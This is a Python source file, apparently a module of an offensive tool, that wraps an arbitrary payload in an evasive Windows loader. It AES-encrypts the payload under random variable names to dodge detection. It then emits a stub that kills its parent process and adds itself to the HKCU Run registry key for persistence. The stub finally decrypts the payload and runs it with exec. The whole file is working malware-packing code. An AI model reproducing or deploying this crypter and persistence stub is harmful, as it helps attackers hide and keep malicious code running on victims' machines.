import Crypto.Cipher.AES as AES
import os
import random
import string


def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))


def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()
    randctypes = randomVar()

    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes', randctypes))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "import Crypto.Cipher.AES as AES \nimport ctypes as %s \n" % randctypes
    newpayload += """from ctypes import c_long, c_int, c_uint, c_char, c_void_p
from ctypes import windll
from ctypes import Structure
from ctypes import sizeof, POINTER, pointer
import signal
import subprocess
import os
import sys

# Constants
TH32CS_SNAPPROCESS = 2


# Struct for PROCESSENTRY32
class PROCESSENTRY32(Structure):
    _fields_ = [('dwSize', c_uint),
                ('cntUsage', c_uint),
                ('th32ProcessID', c_uint),
                ('th32DefaultHeapID', c_uint),
                ('th32ModuleID', c_uint),
                ('cntThreads', c_uint),
                ('th32ParentProcessID', c_uint),
                ('pcPriClassBase', c_long),
                ('dwFlags', c_uint),
                ('szExeFile', c_char * 260),
                ('th32MemoryBase', c_long),
                ('th32AccessKey', c_long)]


# Foreign functions
## CreateToolhelp32Snapshot
CreateToolhelp32Snapshot = windll.kernel32.CreateToolhelp32Snapshot
CreateToolhelp32Snapshot.reltype = c_long
CreateToolhelp32Snapshot.argtypes = [c_int, c_int]
## Process32First
Process32First = windll.kernel32.Process32First
Process32First.argtypes = [c_void_p, POINTER(PROCESSENTRY32)]
Process32First.rettype = c_int
## Process32Next
Process32Next = windll.kernel32.Process32Next
Process32Next.argtypes = [c_void_p, POINTER(PROCESSENTRY32)]
Process32Next.rettype = c_int
## CloseHandle
CloseHandle = windll.kernel32.CloseHandle
CloseHandle.argtypes = [c_void_p]
CloseHandle.rettype = c_int


def wingetppid(pid):
    ''' Get get parent process pid for process `pid`
    '''
    ppid = None
    hProcessSnap = c_void_p(0)
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    pe32 = PROCESSENTRY32()
    pe32.dwSize = sizeof(PROCESSENTRY32)
    ret = Process32First(hProcessSnap, pointer(pe32))

    while ret:
        if pe32.th32ProcessID == pid:
            ppid = pe32.th32ParentProcessID
        ret = Process32Next(hProcessSnap, pointer(pe32))
    CloseHandle(hProcessSnap)
    return ppid
    """
    newpayload += "\nos.kill(wingetppid(os.getpid()), signal.SIGTERM)\n"
    newpayload += "\nname_ = os.path.splitext(os.path.basename(sys.argv[0]))[0]\n"
    newpayload += "value_ = sys.argv[0]\n"
    newpayload += """try:
    cmd = 'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v ' + name_ + ' /d "' + value_ + '" /f'
    ret_code = subprocess.call(cmd, shell=True)
except Exception:
    pass"""
    newpayload += "\n%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "decrypto = AES.new(%s , AES.MODE_CTR, counter=lambda: %s )\n" % (randkey, randcounter)
    newpayload += "%s = decrypto.decrypt('%s'.decode('hex')) \n" % (randcipher, encrypted.encode('hex'))
    newpayload += "exec(%s)" % randcipher
    return newpayload
